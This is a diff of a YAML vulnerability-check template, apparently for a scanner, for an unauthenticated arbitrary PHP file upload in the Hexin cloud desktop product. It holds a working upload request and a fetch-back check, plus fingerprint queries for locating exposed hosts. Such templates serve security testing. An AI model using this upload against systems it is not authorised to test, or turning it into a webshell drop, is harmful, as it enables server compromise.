@@ -1,41 +1,44 @@
+expression: r0() && r1()
 id: vesystem-upload-file
-
 info:
-  name: 和信云桌面未授权任意文件上传
-  severity: critical
-  author: 数星星
-  verified: true
-  description: |
-    和信创天下一代云桌面系统融合了VDI、VOI、IDV三大架构优势的云桌面产品，实现了前后端混合计算，兼顾移动办公和窄带环境下3D高清播放和外设硬件全兼容，满足大规模终端的管理、安全、运维需求。2021HW期间，爆出和信创天下一代云桌面爆出文件上传漏洞，攻击者可利用该漏洞写入php恶意代码，从而控制服务器。
-    body="和信下一代云桌面"
-    zoomEy：title:和信下一代云桌面
+  author: "\u6570\u661F\u661F"
+  description: "\u548C\u4FE1\u521B\u5929\u4E0B\u4E00\u4EE3\u4E91\u684C\u9762\u7CFB\
+    \u7EDF\u878D\u5408\u4E86VDI\u3001VOI\u3001IDV\u4E09\u5927\u67B6\u6784\u4F18\u52BF\
+    \u7684\u4E91\u684C\u9762\u4EA7\u54C1\uFF0C\u5B9E\u73B0\u4E86\u524D\u540E\u7AEF\
+    \u6DF7\u5408\u8BA1\u7B97\uFF0C\u517C\u987E\u79FB\u52A8\u529E\u516C\u548C\u7A84\
+    \u5E26\u73AF\u5883\u4E0B3D\u9AD8\u6E05\u64AD\u653E\u548C\u5916\u8BBE\u786C\u4EF6\
+    \u5168\u517C\u5BB9\uFF0C\u6EE1\u8DB3\u5927\u89C4\u6A21\u7EC8\u7AEF\u7684\u7BA1\
+    \u7406\u3001\u5B89\u5168\u3001\u8FD0\u7EF4\u9700\u6C42\u30022021HW\u671F\u95F4\
+    \uFF0C\u7206\u51FA\u548C\u4FE1\u521B\u5929\u4E0B\u4E00\u4EE3\u4E91\u684C\u9762\
+    \u7206\u51FA\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\
+    \u5229\u7528\u8BE5\u6F0F\u6D1E\u5199\u5165php\u6076\u610F\u4EE3\u7801\uFF0C\u4ECE\
+    \u800C\u63A7\u5236\u670D\u52A1\u5668\u3002\nbody=\"\u548C\u4FE1\u4E0B\u4E00\u4EE3\
+    \u4E91\u684C\u9762\"\nzoomEy\uFF1Atitle:\u548C\u4FE1\u4E0B\u4E00\u4EE3\u4E91\u684C\
+    \u9762\n"
+  name: "\u548C\u4FE1\u4E91\u684C\u9762\u672A\u6388\u6743\u4EFB\u610F\u6587\u4EF6\u4E0A\
+    \u4F20"
   reference:
-    - https://www.secpulse.com/archives/158674.html
-
-set:
-  r1: randomInt(10000, 99999)
-  r2: randomLowercase(32)
-  md5str: md5(r2)
-  rboundary: randomLowercase(8)
+  - https://www.secpulse.com/archives/158674.html
+  severity: critical
+  verified: true
 rules:
   r0:
+    expression: response.status == 200 && response.body.bcontains(b'_Requst:<br>')
     request:
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+        \ name=\"file\"; filename=\"{{r1}}.php\"\r\nContent-Type: image/avif\r\n\r\
+        \n{{md5str}}\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
       method: POST
       path: /Upload/upload_file.php?l=test
-      headers:
-        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}} 
-      body: "\
-        ------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.php\"\r\n\
-        Content-Type: image/avif\r\n\
-        \r\n\
-        {{md5str}}\r\n\
-        ------WebKitFormBoundary{{rboundary}}--\r\n\
-        "
-    expression: response.status == 200 && response.body.bcontains(b'_Requst:<br>')
   r1:
+    expression: response.status == 200 && response.body.bcontains(bytes(md5str))
     request:
       method: GET
       path: /Upload/test/{{r1}}.php
-    expression: response.status == 200 && response.body.bcontains(bytes(md5str))
-expression: r0() && r1()
+set:
+  md5str: md5(r2)
+  r1: randomInt(10000, 99999)
+  r2: randomLowercase(32)
+  rboundary: randomLowercase(8)
